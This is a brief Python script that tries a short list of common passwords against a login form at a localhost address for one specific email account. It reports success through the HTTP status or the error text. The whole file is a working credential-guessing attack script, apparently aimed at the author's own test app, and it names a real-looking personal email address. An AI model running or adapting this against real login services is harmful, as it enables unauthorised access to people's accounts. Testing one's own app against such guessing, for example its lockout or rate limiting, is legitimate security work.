import requests

login_url = "http://127.0.0.1:5000/login"

email = "ellisarm6@gmail.com"

passwords = [
    "test1",
    "123456",
    "password",
    "qwerty",
    "admin",
    "ellis123"
]

for password in passwords:
    response = requests.post(login_url, data={
        "email": email,
        "password": password
    }, allow_redirects=False)

    print("Trying password:", password)
    print("Status code:", response.status_code)

    if "Wrong password" in response.text:
        print("Result: wrong password")
    elif response.status_code == 302:
        print("Result: login success")
    else:
        print("Result:", response.text)

    print("-" * 40)